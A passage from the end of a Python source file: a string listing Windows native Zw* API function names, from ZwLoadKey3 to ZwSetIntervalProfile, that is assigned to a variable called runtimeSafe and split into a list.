ZwLoadKey3
ZwLoadKeyEx
ZwLockFile
ZwLockProductActivationKeys
ZwLockRegistryKey
ZwLockVirtualMemory
ZwMakePermanentObject
ZwMakeTemporaryObject
ZwManageHotPatch
ZwManagePartition
ZwMapCMFModule
ZwMapUserPhysicalPages
ZwMapUserPhysicalPagesScatter
ZwMapViewOfSection
ZwMapViewOfSectionEx
ZwModifyBootEntry
ZwModifyDriverEntry
ZwNotifyChangeDirectoryFile
ZwNotifyChangeDirectoryFileEx
ZwNotifyChangeKey
ZwNotifyChangeMultipleKeys
ZwNotifyChangeSession
ZwOpenCpuPartition
ZwOpenDirectoryObject
ZwOpenEnlistment
ZwOpenEvent
ZwOpenEventPair
ZwOpenFile
ZwOpenIoCompletion
ZwOpenJobObject
ZwOpenKey
ZwOpenKeyEx
ZwOpenKeyTransacted
ZwOpenKeyTransactedEx
ZwOpenKeyedEvent
ZwOpenMutant
ZwOpenObjectAuditAlarm
ZwOpenPartition
ZwOpenPrivateNamespace
ZwOpenProcess
ZwOpenProcessToken
ZwOpenProcessTokenEx
ZwOpenRegistryTransaction
ZwOpenResourceManager
ZwOpenSection
ZwOpenSemaphore
ZwOpenSession
ZwOpenSymbolicLinkObject
ZwOpenThread
ZwOpenThreadToken
ZwOpenThreadTokenEx
ZwOpenTimer
ZwOpenTransaction
ZwOpenTransactionManager
ZwPlugPlayControl
ZwPowerInformation
ZwPrePrepareComplete
ZwPrePrepareEnlistment
ZwPrepareComplete
ZwPrepareEnlistment
ZwPrivilegeCheck
ZwPrivilegeObjectAuditAlarm
ZwPrivilegedServiceAuditAlarm
ZwPropagationComplete
ZwPropagationFailed
ZwProtectVirtualMemory
ZwPssCaptureVaSpaceBulk
ZwPulseEvent
ZwQueryAttributesFile
ZwQueryAuxiliaryCounterFrequency
ZwQueryBootEntryOrder
ZwQueryBootOptions
ZwQueryDebugFilterState
ZwQueryDefaultLocale
ZwQueryDefaultUILanguage
ZwQueryDirectoryFile
ZwQueryDirectoryFileEx
ZwQueryDirectoryObject
ZwQueryDriverEntryOrder
ZwQueryEaFile
ZwQueryEvent
ZwQueryFullAttributesFile
ZwQueryInformationAtom
ZwQueryInformationByName
ZwQueryInformationCpuPartition
ZwQueryInformationEnlistment
ZwQueryInformationFile
ZwQueryInformationJobObject
ZwQueryInformationPort
ZwQueryInformationProcess
ZwQueryInformationResourceManager
ZwQueryInformationThread
ZwQueryInformationToken
ZwQueryInformationTransaction
ZwQueryInformationTransactionManager
ZwQueryInformationWorkerFactory
ZwQueryInstallUILanguage
ZwQueryIntervalProfile
ZwQueryIoCompletion
ZwQueryIoRingCapabilities
ZwQueryKey
ZwQueryLicenseValue
ZwQueryMultipleValueKey
ZwQueryMutant
ZwQueryObject
ZwQueryOpenSubKeys
ZwQueryOpenSubKeysEx
ZwQueryPerformanceCounter
ZwQueryPortInformationProcess
ZwQueryQuotaInformationFile
ZwQuerySection
ZwQuerySecurityAttributesToken
ZwQuerySecurityObject
ZwQuerySecurityPolicy
ZwQuerySemaphore
ZwQuerySymbolicLinkObject
ZwQuerySystemEnvironmentValue
ZwQuerySystemEnvironmentValueEx
ZwQuerySystemInformation
ZwQuerySystemInformationEx
ZwQuerySystemTime
ZwQueryTimer
ZwQueryTimerResolution
ZwQueryValueKey
ZwQueryVirtualMemory
ZwQueryVolumeInformationFile
ZwQueryWnfStateData
ZwQueryWnfStateNameInformation
ZwQueueApcThread
ZwQueueApcThreadEx
ZwQueueApcThreadEx2
ZwRaiseException
ZwRaiseHardError
ZwReadFile
ZwReadFileScatter
ZwReadOnlyEnlistment
ZwReadRequestData
ZwReadVirtualMemory
ZwReadVirtualMemoryEx
ZwRecoverEnlistment
ZwRecoverResourceManager
ZwRecoverTransactionManager
ZwRegisterProtocolAddressInformation
ZwRegisterThreadTerminatePort
ZwReleaseKeyedEvent
ZwReleaseMutant
ZwReleaseSemaphore
ZwReleaseWorkerFactoryWorker
ZwRemoveIoCompletion
ZwRemoveIoCompletionEx
ZwRemoveProcessDebug
ZwRenameKey
ZwRenameTransactionManager
ZwReplaceKey
ZwReplacePartitionUnit
ZwReplyPort
ZwReplyWaitReceivePort
ZwReplyWaitReceivePortEx
ZwReplyWaitReplyPort
ZwRequestPort
ZwRequestWaitReplyPort
ZwResetEvent
ZwResetWriteWatch
ZwRestoreKey
ZwResumeProcess
ZwResumeThread
ZwRevertContainerImpersonation
ZwRollbackComplete
ZwRollbackEnlistment
ZwRollbackRegistryTransaction
ZwRollbackTransaction
ZwRollforwardTransactionManager
ZwSaveKey
ZwSaveKeyEx
ZwSaveMergedKeys
ZwSecureConnectPort
ZwSerializeBoot
ZwSetBootEntryOrder
ZwSetBootOptions
ZwSetCachedSigningLevel
ZwSetCachedSigningLevel2
ZwSetContextThread
ZwSetDebugFilterState
ZwSetDefaultHardErrorPort
ZwSetDefaultLocale
ZwSetDefaultUILanguage
ZwSetDriverEntryOrder
ZwSetEaFile
ZwSetEvent
ZwSetEventBoostPriority
ZwSetHighEventPair
ZwSetHighWaitLowEventPair
ZwSetIRTimer
ZwSetInformationCpuPartition
ZwSetInformationDebugObject
ZwSetInformationEnlistment
ZwSetInformationFile
ZwSetInformationIoRing
ZwSetInformationJobObject
ZwSetInformationKey
ZwSetInformationObject
ZwSetInformationProcess
ZwSetInformationResourceManager
ZwSetInformationSymbolicLink
ZwSetInformationThread
ZwSetInformationToken
ZwSetInformationTransaction
ZwSetInformationTransactionManager
ZwSetInformationVirtualMemory
ZwSetInformationWorkerFactory
ZwSetIntervalProfile"""
runtimeSafe = runtimeSafe.splitlines()